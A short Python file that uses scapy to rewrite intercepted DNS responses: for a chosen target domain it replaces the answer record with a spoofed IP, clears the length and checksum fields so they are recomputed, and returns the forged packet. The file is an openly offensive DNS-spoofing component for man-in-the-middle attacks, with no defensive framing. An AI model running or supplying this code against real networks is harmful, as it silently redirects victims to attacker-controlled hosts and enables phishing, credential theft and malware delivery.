from scapy.all import IP, DNS, DNSQR, DNSRR, Ether
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.dns import DNS, DNSRR, DNSQR

def process_packet(target_domain, spoof_ip, payload) -> bytes:
    scapy_packet = IP(bytes(payload))
    if scapy_packet.haslayer(DNSRR):
        try:
            q_name = scapy_packet[DNSQR].qname
            str_q_name = q_name.decode("utf-8")
            print("[*] DNS response for {} detected".format(str_q_name))
            if target_domain in str_q_name:            
                if scapy_packet.haslayer(UDP):            
                    print("[+] Spoofing DNS response for {} to {}".format(str_q_name, spoof_ip))
                    scapy_packet[DNS].an = DNSRR(rrname=q_name, rdata=spoof_ip)
                    scapy_packet[DNS].ancount = 1
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum
                    return bytes(scapy_packet)
                else:
                    print("[-] DNS is TCP based and it couldn't be spoofed")
        except IndexError as error:
            print("[!] Python exception: {}".format(error))

    return []
